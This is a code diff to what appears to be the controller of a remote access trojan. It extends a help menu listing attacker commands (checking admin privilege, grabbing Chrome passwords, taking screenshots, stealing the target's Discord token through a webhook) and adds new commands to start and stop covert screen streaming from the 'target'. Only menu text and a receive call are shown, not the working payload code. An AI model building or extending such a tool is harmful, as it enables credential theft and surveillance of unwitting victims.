@@ -103,7 +103,10 @@ def target_communication():
 		checkpriv                           --> check admin privilege
 		chromegrab                          --> grab chrome passwords
 		screenshot                          --> get target screenshot
-		dtoken                              --> get target discord token(through discord webhook)''', 'green'))
+		dtoken                              --> get target discord token(through discord webhook)
+		stream                              --> start screenshare between you and the target
+		stop_stream                         --> stop screenshare between you and the target
+		''', 'green'))
         else:
             result = reliable_recv()
             print(result)
